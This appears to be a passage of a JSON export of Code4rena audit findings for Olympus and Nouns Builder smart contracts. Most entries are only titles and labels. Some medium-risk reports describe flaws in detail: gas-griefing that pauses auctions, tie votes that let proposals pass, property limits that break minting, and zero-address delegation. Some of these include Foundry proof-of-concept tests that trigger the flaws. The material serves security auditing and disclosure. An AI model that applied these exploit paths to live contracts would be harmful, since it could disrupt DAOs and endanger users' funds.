Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/17", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/16", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Potential Reward tokens Rug Pull by heart admin.", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/14", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-08-olympus-findings", "body": "Potential Reward tokens Rug Pull by heart admin."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/10", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/8", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/7", "labels": ["bug", "high quality report", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/6", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/5", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/4", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/3", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/1", "labels": [], "target": "2022-08-olympus-findings", "body": "Agreements & Disclosures"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/722", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/720", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Malicious pausing the contract", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/719", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L204 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L206 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L235   # Vulnerability details  # Vulnerability details  ## Description  There is a function `_createAuction` in `Auction` contract.  It consist the following logic:  ``` /// @dev Creates an auction for the next token function _createAuction() private {     // Get the next token available for bidding     try token.mint() returns (uint256 tokenId) {         **creating of the auction for token with id equal to tokenId**          // Pause the contract if token minting failed     } catch Error(string memory) {         _pause();     } } ```  According to the [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md) `call` opcode can consume as most `63/64` of parrent calls' gas. That means `token.mint()` can fail since there will be no gas.   All in all, if `token.mint()` fail on gas and the rest gas is enough for pausing the contract by calling `_pause` in `catch` statement the contract will be paused.  Please note, that a bug can be exploitable if the token.mint() consume more than 1.500.000 of gas, because 1.500.000 / 64 > 20.000 that need to pause the contract. Also, the logic of `token.mint()` includes traversing the array up to 100 times, that's heavy enough to reach 1.500.000 gas limit.   ## Impact  Contract can be paused by any user by passing special amount of gas for the call of `settleCurrentAndCreateNewAuction` (which consists of two internal calls of `_settleAuction` and `_createAuction` functions).  ## Recommended Mitigation Steps  Add a special check for upper bound of `gasLeft` at start of `_createAuction` function."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/718", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/717", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/716", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/713", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/712", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/709", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/704", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/698", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/696", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/687", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/686", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/684", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/683", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "[M3] Missing storage gaps in upgradeable contracts", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/682", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "[M3] Missing storage gaps in upgradeable contracts"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/679", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/670", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/665", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/663", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/661", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/658", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/657", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/655", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/648", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/645", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/642", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/639", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Auction.sol : Owner can unilaterly set the minBidIncrement  value as per their wish", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/638", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "Auction.sol : Owner can unilaterly set the minBidIncrement  value as per their wish"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/635", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "State function does not require majority of votes for supporting and passing a proposal", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/626", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456   # Vulnerability details  ## Impact When determining the proposal's state, the following `state` function is called, which can execute `else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) { return ProposalState.Defeated; }`. If `proposal.forVotes` and `proposal.againstVotes` are the same, the proposal is not considered defeated when the quorum votes are reached by the for votes. However, many electoral systems require that the for votes to be more than the against votes in order to conclude that the proposal is passed because the majority of votes supports it. If the deployed DAO wants to require the majority of votes to support a proposal in order to pass it, the `state` function would incorrectly conclude that the proposal is not defeated when the for votes and against votes are the same at the end of voting. As a result, critical proposals, such as for updating implementations or withdrawing funds from the treasury, that should not be passed can be passed, or vice versa, so the impact can be huge.  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456 ```solidity     function state(bytes32 _proposalId) public view returns (ProposalState) {         // Get a copy of the proposal         Proposal memory proposal = proposals[_proposalId];          // Ensure the proposal exists         if (proposal.voteStart == 0) revert PROPOSAL_DOES_NOT_EXIST();          // If the proposal was executed:         if (proposal.executed) {             return ProposalState.Executed;              // Else if the proposal was canceled:         } else if (proposal.canceled) {             return ProposalState.Canceled;              // Else if the proposal was vetoed:         } else if (proposal.vetoed) {             return ProposalState.Vetoed;              // Else if voting has not started:         } else if (block.timestamp < proposal.voteStart) {             return ProposalState.Pending;              // Else if voting has not ended:         } else if (block.timestamp < proposal.voteEnd) {             return ProposalState.Active;              // Else if the proposal failed (outvoted OR didn't reach quorum):         } else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {             return ProposalState.Defeated;              // Else if the proposal has not been queued:         } else if (settings.treasury.timestamp(_proposalId) == 0) {             return ProposalState.Succeeded;              // Else if the proposal can no longer be executed:         } else if (settings.treasury.isExpired(_proposalId)) {             return ProposalState.Expired;              // Else the proposal is queued         } else {             return ProposalState.Queued;         }     } ```  ## Proof of Concept Please append the following test in `test\\Gov.t.sol`. This test will pass to demonstrate the described scenario.  ```solidity     function test_ProposalIsSucceededWhenNumberOfForAndAgainstVotesAreSame() public {         vm.prank(founder);         auction.unpause();          createVoters(7, 5 ether);          vm.prank(address(treasury));         governor.updateQuorumThresholdBps(2000);          bytes32 proposalId = createProposal();          vm.warp(block.timestamp + governor.votingDelay());          // number of for and against votes are both 2         castVotes(proposalId, 2, 2, 3);          vm.warp(block.timestamp + governor.votingPeriod());          // the proposal is considered succeeded when number of for and against votes are the same after voting ends         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Succeeded));          // the proposal can be queued afterwards         governor.queue(proposalId);         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Queued));     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps If there is no need to pass a proposal when `proposal.forVotes` and `proposal.againstVotes` are the same at the end of voting, then https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441-L442 can be changed to the following code. ```solidity         } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {             return ProposalState.Defeated; ```  Otherwise, a governance configuration can be added to indicate whether the majority of votes is needed or not for supporting and passing a proposal. The `state` function then could return `ProposalState.Defeated` when `proposal.forVotes <= proposal.againstVotes` if so and when `proposal.forVotes < proposal.againstVotes` if not."}, {"title": "Compromised or malicious vetoer can veto any proposals with unrestricted power", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged", "sponsor disputed"], "target": "2022-09-nouns-builder-findings", "body": "Compromised or malicious vetoer can veto any proposals with unrestricted power"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/619", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Quorum votes have no effect for determining whether proposal is defeated or succeeded when token supply is low", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/607", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-09-nouns-builder-findings", "body": "Quorum votes have no effect for determining whether proposal is defeated or succeeded when token supply is low"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/593", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/592", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/587", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/585", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/584", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/577", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/573", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/572", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/568", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/556", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/554", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/552", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/551", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/548", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/547", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/544", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/543", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Loss of Veto Power can Lead to 51% Attack", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/533", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2022-09-nouns-builder-findings", "body": "Loss of Veto Power can Lead to 51% Attack"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/532", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/530", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/528", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/527", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Index out of bounds error when properties length is more than attributes length breaks minting", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/523", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L188-L198   # Vulnerability details  ## Description  When a token is minted, the ```MetadataRenderer.sol``` ```onMinted``` function is called which will set the particular token's attributes to a random item from one of the properties. A token has a maximum of 16 attributes, the first one being the total number of properties. The properties from which the token receives its attributes are supplied by the owner of the ```MetadataRenderer.sol``` contract by calling ```addProperties```. The issue is that the number of properties the owner can supply is not limited. If the number of properties is more than 15 then the ```onMinted``` function will revert due to the limit on the number of attributes a token may have.  ## Impact  Since ```onMinted``` is always called when tokens are minted, the DAO will not be able to mint new tokens. There does not seem to be a way to remove properties so this would be unrecoverable.  ## Proof of Concept  Test code added to ```Token.t.sol```: ```solidity     function test_MetadataProperties() public {         createUsers(2, 1 ether);          address[] memory wallets = new address[](2);         uint256[] memory percents = new uint256[](2);         uint256[] memory vestExpirys = new uint256[](2);          uint256 pct = 50;         uint256 end = 4 weeks;          unchecked {             for (uint256 i; i < 2; ++i) {                 wallets[i] = otherUsers[i];                 percents[i] = pct;                 vestExpirys[i] = end;             }         }          deployWithCustomFounders(wallets, percents, vestExpirys);          // Check deployed correctly         assertEq(token.totalFounders(), 2);         assertEq(token.totalFounderOwnership(), 100);          // Create 16 properties and items         string[] memory names = new string[](16);         MetadataRendererTypesV1.ItemParam[] memory items = new MetadataRendererTypesV1.ItemParam[](16);         for (uint256 j; j < 16; j++) {             names[j] = \"aaa\";                                                                               // Add random properties             items[j].name = \"aaa\";                                                                          // Add random items             items[j].propertyId = uint16(j);                                                                // Make sure all properties have items             items[j].isNewProperty = true;         }          MetadataRendererTypesV1.IPFSGroup memory group = MetadataRendererTypesV1.IPFSGroup(             \"aaa\",             \"aaa\"         );                                                                                                  // Add random IPFS group          // Add 16 properties         vm.prank(otherUsers[0]);         metadataRenderer.addProperties(names, items, group);          // Attempt to mint         vm.prank(address(auction));         vm.expectRevert(stdError.indexOOBError);         token.mint();     } ```  The test code above shows that the owner of ```MetadataRenderer.sol``` is able to add 16 properties with 1 items each. The ```auction``` contract is then unable to mint due to an \"Index out of bounds\" error.  Code from the ```onMinted``` function in ```MetadataRenderer.sol```: ```solidity             // For each property:             for (uint256 i = 0; i < numProperties; ++i) {                 // Get the number of items to choose from                 uint256 numItems = properties[i].items.length;                  // Use the token's seed to select an item                 tokenAttributes[i + 1] = uint16(seed % numItems);                  // Adjust the randomness                 seed >>= 16;             } ```  The code above shows that when a token is minted and ```onMinted``` is called it will attempt to assign more than 16 attributes to the token which is not possible due to the ```tokenAttributes``` being limited to 16.  ## Recommended Mitigation Steps  The maximum amount of properties an owner can add should be less than the maximum amount of attributes any token can have. Consider either limiting the ```properties``` variable in ```MetadataRenderer.sol``` to 15 or allow any number of attributes to be added to a token."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/520", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/516", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/515", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/512", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Execute doesn't check for the expiration of a proposal", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/510", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "Execute doesn't check for the expiration of a proposal"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/506", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/505", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/502", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/496", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/489", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/483", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Proposals can be bricked and Auctions stalled by bad settings", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/482", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L588   # Vulnerability details  ## Impact  The protocol assumes founders and proposals will set sane settings. However there are some settings that if set incorrectly will block proposals from being created or succeeding and block auctions from completing.  This vulnerability has a low likelihood of occurrence as the outcome is not in the interest of the community. However the possibility exists if there is some misunderstanding or miscalculation. If a bad setting is allowed the impact is high.  ## Proof of Concept  ### Bricking governance proposals  **Governor settings.quorumThresholdBps > 10_000**  If `quorumThresholdBps` is set above 10_000 then it would be impossible to get enough votes to succeed.  Without being able to execute a proposal the setting itself could never be fixed.  **Governor settings.proposalThresholdBps > 10_000**  If `proposalThresholdBps` is set above 10_000 then it would be impossible to submit a proposal.  Without being able to submit a proposal the setting itself could never be fixed.  ### Stalling a governance proposal  **Treasury settings.delay**  A very large value for `delay` would prevent a proposal from being executed.  For example 1000 years easily fits into `delay` and would result in a 1000 year wait before being able to execute.  A governance proposal could fix this property for future proposals but any proposal created with the large `delay` would remain stuck.  ### Stalling the auction  **Auction settings.duration**  The `duration` value is in seconds and any value up to type(uint40).max is permitted.  That is `1099511627775` seconds which is > 48000 years.  A large value like this would stop the auction from ever ending and thus stop new NFTs from being minted.  A governance proposal could fix this setting but ideally a very large `duration` would be blocked.  **Auction settings.timeBuffer**  Similar to duration but applies to the auction endTime extention.  So the auction could be extended a number of years for example.  ## Tools Used  Manual review.  ## Recommended Mitigation Steps  Implement reasonable range bounds reverting where appropriate. In particular for the above apply: - Governor settings `quorumThresholdBps` <= 10_000 - Governor settings `proposalThresholdBps` <= 10_000 - Treasury settings `delay` <= 6 months - Auction settings `duration` <= 6 months - Auction settings `timeBuffer` <= 6 months  Add these checks to the `initialize()` functions and in the setter / update functions where these individual settings properties can be updated. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/481", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/480", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Attackers can increase voting power by incentivizing", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged", "sponsor disputed", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Attackers can increase voting power by incentivizing"}, {"title": "NFT owner can block token burning and transfer by delegating to zero address", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/478", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190   # Vulnerability details  ERC721Votes's delegate() and delegateBySig() allow the delegation to zero address, which result in owner's votes elimination in the checkpoint. I.e. the votes are subtracted from the owner, but aren't added anywhere. _moveDelegateVotes() invoked by _delegate() treats the corresponding call as a burning, erasing the votes.  The impact is that the further transfer and burning attempts for the ids of the owner will be reverted because _afterTokenTransfer() callback will try to reduce owner's votes, which are already zero, reverting the calls due to subtraction fail.  As ERC721Votes is parent to Token the overall impact is governance token burning and transfer being disabled whenever the owner delegated to zero address. This can be done deliberately, i.e. any owner can disable burning and transfer of the owned ids at any moment, which can interfere with governance voting process.  ## Proof of Concept  User facing delegate() and delegateBySig() allow for zero address delegation:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135  ```solidity     /// @notice Delegates votes to an account     /// @param _to The address delegating votes to     function delegate(address _to) external {         _delegate(msg.sender, _to);     } ```  